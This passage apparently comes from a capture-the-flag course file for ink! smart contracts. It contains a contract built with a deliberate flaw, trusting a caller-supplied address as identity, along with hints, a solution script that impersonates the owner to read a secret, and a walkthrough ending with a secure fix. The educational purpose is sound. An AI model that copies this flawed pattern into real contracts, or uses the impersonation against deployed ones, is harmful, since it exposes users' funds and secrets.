              Self {
                  trusted_contract_address,
              }
          }
  
          // Vulnerable function: It allows the user to specify 'user_address_to_act_as'.
          // It then calls 'get_secret_via_proxy' on TrustedContract using this user-provided address.
          #[ink(message)]
          pub fn call_trusted_contract_get_secret(&self, user_address_to_act_as: AccountId) -> Result<u128, VulnerableError> {
              use ink::env::call::{build_call, ExecutionInput, Selector};
              
              const GET_SECRET_VIA_PROXY_SELECTOR: [u8; 4] = [0xCA, 0xFE, 0xBA, 0xBE]; // Placeholder selector
              
              let call = build_call::<ink::env::DefaultEnvironment>()
                  .call(self.trusted_contract_address)
                  .gas_limit(0) // Use default gas limit or specify
                  .transferred_value(0)
                  .exec_input(
                      ExecutionInput::new(Selector::new(GET_SECRET_VIA_PROXY_SELECTOR))
                          .push_arg(user_address_to_act_as), // This is the crucial part
                  )
                  .returns::<Result<u128, trusted_contract_mod::TrustedError>>() // Specify return type
                  .params();
  
              match ink::env::invoke_contract(&call) {
                  Ok(Ok(value)) => Ok(value),
                  Ok(Err(_trusted_error)) => Err(VulnerableError::TrustedContractError), // Map error
                  Err(_) => Err(VulnerableError::CrossCallFailed),
              }
          }
      }
  }`,
    hints: [
      'The `VulnerableContract` makes a call to `TrustedContract`.',
      'The `TrustedContract::get_secret_via_proxy` function checks `caller_on_behalf_of` against its owner.',
      'The `VulnerableContract::call_trusted_contract_get_secret` function takes `user_address_to_act_as` as a parameter and passes it to the `TrustedContract`.',
      'You need to find the owner of the `TrustedContract` first. Then, call the `VulnerableContract` providing the owner\'s address as `user_address_to_act_as`.'
    ],
    solution: `// Assume 'trustedContract' and 'vulnerableContract' are objects representing the deployed contracts.
  // And 'myAccountId' is your account ID.
  
  // Step 1: Get the owner of the TrustedContract.
  // This would typically be a public getter or known from deployment.
  // For the CTF, let's assume trustedContract.get_owner() exists.
  const ownerOfTrustedContract = await trustedContract.get_owner();
  console.log("Owner of TrustedContract:", ownerOfTrustedContract);
  
  // Step 2: Call the VulnerableContract, telling it to act as the owner of TrustedContract.
  // The vulnerableContract will then call trustedContract.get_secret_via_proxy(ownerOfTrustedContract).
  // Since ownerOfTrustedContract == trustedContract.owner, the check passes.
  try {
      const secretValue = await vulnerableContract.call_trusted_contract_get_secret(ownerOfTrustedContract);
      console.log("Successfully retrieved secret value:", secretValue);
      if (secretValue > 0) { // Or some known secret value for the CTF
          console.log("Cross-contract attack successful! Challenge complete.");
      } else {
          console.log("Retrieved a value, but it might not be the secret. Check logic.");
      }
  } catch (error) {
      console.error("Error during cross-contract call:", error);
      console.log("Cross-contract attack failed. Ensure the owner address is correct and the contracts are set up as expected.");
  }
  `,
    walkthrough: [
      {
        title: 'Understanding Cross-Contract Vulnerabilities',
        content: 'This level involves two contracts: a `TrustedContract` that holds a secret value, and a `VulnerableContract` that can call the `TrustedContract`. The vulnerability lies in how the `TrustedContract` verifies the caller when called *through* the `VulnerableContract`. The `TrustedContract` has a function `get_secret_via_proxy` which is intended to be called by other contracts acting on behalf of a user. It trusts the `caller_on_behalf_of` parameter it receives.',
        code: `// TrustedContract's vulnerable function:
  #[ink(message)]
  pub fn get_secret_via_proxy(&self, caller_on_behalf_of: AccountId) -> Result<u128, TrustedError> {
      if caller_on_behalf_of != self.owner { // It checks the parameter, not the actual msg.sender
          return Err(TrustedError::NotOwner);
      }
      Ok(self.secret_value)
  }`
      },
      {
        title: 'Step 1: Analyze the Vulnerable Contract',
        content: 'The `VulnerableContract` has a function `call_trusted_contract_get_secret`. This function takes an address `user_address_to_act_as` and passes it directly as the `caller_on_behalf_of` argument to the `TrustedContract`\'s `get_secret_via_proxy` function. It does not verify if the *actual caller* of `call_trusted_contract_get_secret` is authorized to act as `user_address_to_act_as`.',
        code: `// VulnerableContract's function:
  #[ink(message)]
  pub fn call_trusted_contract_get_secret(&self, user_address_to_act_as: AccountId) -> Result<u128, VulnerableError> {
      // ... build_call setup ...
      // .push_arg(user_address_to_act_as), // Passes user_address_to_act_as directly
      // ... invoke_contract ...
  }`
      },
      {
        title: 'Step 2: Get the Owner Address of TrustedContract',
        content: 'To exploit this, you first need to find out who the owner of the `TrustedContract` is. Usually, contracts have a public getter for the owner, or this information might be known from the deployment context.',
        code: `// Get the owner of the trusted contract
  const ownerOfTrustedContract = await trustedContract.get_owner();
  console.log("Owner of TrustedContract:", ownerOfTrustedContract);`
      },
      {
        title: 'Step 3: Exploit the Vulnerability',
        content: 'Once you have the `ownerOfTrustedContract` address, you call `VulnerableContract::call_trusted_contract_get_secret`, passing `ownerOfTrustedContract` as the `user_address_to_act_as` argument. The `VulnerableContract` will then call `TrustedContract::get_secret_via_proxy` with `caller_on_behalf_of` set to `ownerOfTrustedContract`. Since this matches the `TrustedContract`\'s actual owner, the check inside `get_secret_via_proxy` passes, and it returns the secret value to the `VulnerableContract`, which then returns it to you.',
        code: `// Call the vulnerable contract, pretending to be the owner of the trusted contract
  const secretValue = await vulnerableContract.call_trusted_contract_get_secret(ownerOfTrustedContract);
  console.log("Retrieved secret value:", secretValue);`
      },
      {
        title: 'Security Lesson',
        content: 'When a contract (Contract A) calls another contract (Contract B), and Contract B needs to make decisions based on the original user\'s identity, Contract B should *always* rely on `self.env().caller()` (which will be Contract A\'s address) and potentially require Contract A to implement a secure way of attesting to the original user\'s identity (e.g., by Contract A checking `self.env().caller()` for the user and then passing a signed message or using a specific trusted forwarder pattern). Never trust an address parameter as the identity of the true caller without rigorous verification.',
        code: `// Secure way for TrustedContract (if it must allow proxy calls):
  // It would need a system where VulnerableContract is registered as a trusted forwarder,
  // or VulnerableContract would need to pass a signature from the original user.
  // Simpler secure direct call:
  #[ink(message)]
  pub fn get_secret_secure(&self) -> Result<u128, TrustedError> {
      if self.env().caller() != self.owner { // Checks the *actual* immediate caller
          return Err(TrustedError::NotOwner);
      }
      Ok(self.secret_value)
  }`
      }
    ],
    completed: false
  }
];
